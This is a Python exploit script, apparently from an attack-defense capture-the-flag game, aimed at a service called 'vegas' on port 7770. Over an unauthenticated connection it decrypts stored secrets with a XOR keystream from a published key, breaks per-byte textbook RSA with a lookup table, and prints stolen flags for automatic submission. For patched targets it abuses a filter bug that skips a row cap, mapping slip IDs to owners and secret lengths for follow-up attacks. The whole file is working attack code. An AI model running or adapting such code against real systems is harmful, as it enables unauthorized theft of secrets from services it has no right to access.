#!/usr/bin/env python3
"""vegas (:7770) recon + triage.

Does three things in one unauthenticated connection:

  1. Farms any target that is still PRISTINE -- sig.code_hex XOR the keystream
     derived from the published HOUSE_SIGNING_KEY=1337337 is the plaintext
     secret, so flags print straight out (same chain as vg.py).
  2. Tells you whether a target has GATED the proof panels, by the same XOR:
     a gated row decrypts to filler, a live row decrypts to a flag.
  3. For a gated target, prints the target map the gate still leaks:
     slip_id -> owner -> exact secret byte length.  `sigs ""` is treated as
     "no filter" by select_slips but still skips the 30-row cap, so this walks
     the whole table, not just the newest 30.

Flags go to stdout (one per line) for print-to-submit.  Everything else is
stderr so it never reaches the submitter.
"""
import hashlib
import re
import socket
import sys

PORT = 7770
FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
RSA_E = 65_537
RSA_SHARED_P = 2_147_483_647


def keystream(n, key=b"1337337"):
    out, seed = b"", key
    while len(out) < n:
        seed = hashlib.sha256(seed).digest()
        out += seed
    return out[:n]


def converse(host, lines, timeout=10):
    s = socket.create_connection((host, PORT), timeout)
    s.settimeout(timeout)
    s.sendall(("\n".join(lines) + "\nquit\n").encode())
    buf = b""
    while True:
        try:
            chunk = s.recv(65536)
        except Exception:
            break
        if not chunk:
            break
        buf += chunk
    s.close()
    return buf.decode("utf-8", "replace")


def sig_plaintexts(text):
    """Every sig code_hex in `text`, XORed back through the public keystream."""
    for blob in re.findall(r"^sig .*?code_hex=([0-9a-f]+)", text, re.M):
        raw = bytes.fromhex(blob)
        yield blob, bytes(a ^ b for a, b in zip(raw, keystream(len(raw))))


def rsa_plaintexts(text):
    """Per-byte textbook RSA: 256-entry dictionary, no factoring needed."""
    for modulus, blob in re.findall(
        r"^rsa .*?modulus=(\d+) exponent=\d+ code_hex='?([0-9a-f:]+)'?", text, re.M
    ):
        n = int(modulus)
        table = {pow(b, RSA_E, n): b for b in range(256)}
        try:
            groups = [int(g, 16) for g in blob.split(":")]
        except ValueError:
            continue
        if all(g in table for g in groups):
            yield blob, bytes(table[g] for g in groups)


def exploit(host, flagid=None):
    text = converse(host, ['sigs ""', 'rsa ""'])
    found, gated, live = set(), 0, 0

    for _blob, plain in sig_plaintexts(text):
        hit = FLAG_RE.fullmatch(plain.decode("utf-8", "replace"))
        if hit:
            live += 1
            found.add(hit.group(0))
        else:
            gated += 1
    for _blob, plain in rsa_plaintexts(text):
        for hit in FLAG_RE.finditer(plain.decode("utf-8", "replace")):
            found.add(hit.group(0))

    for flag in sorted(found):
        print(flag)

    rows = re.findall(r"^sig slip_id=(\S+) message='?prove:[0-9a-f]+:(\d+)'?", text, re.M)
    state = "PRISTINE" if live else ("GATED" if gated else "UNKNOWN")
    print(
        "[%s] %s rows=%d live=%d gated=%d flags=%d"
        % (state, host, len(rows), live, gated, len(found)),
        file=sys.stderr,
    )

    if state != "GATED":
        return

    # Gated: dump what the gate still gives away, so the follow-up has a target.
    flagish = [sid for sid, length in rows if length == "32"]
    print(
        "[map] %s: %d/%d slips hold a 32-byte secret"
        % (host, len(flagish), len(rows)),
        file=sys.stderr,
    )
    if not flagish:
        return
    owners = converse(host, ["show %s" % sid for sid in flagish[:40]])
    for line in owners.splitlines():
        m = re.match(r"^slip slip_id=(\S+) owner='?([^'\s]+)'?", line)
        if m:
            print("[map]   slip=%s owner=%s" % (m.group(1), m.group(2)), file=sys.stderr)


if __name__ == "__main__":
    exploit(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else None)
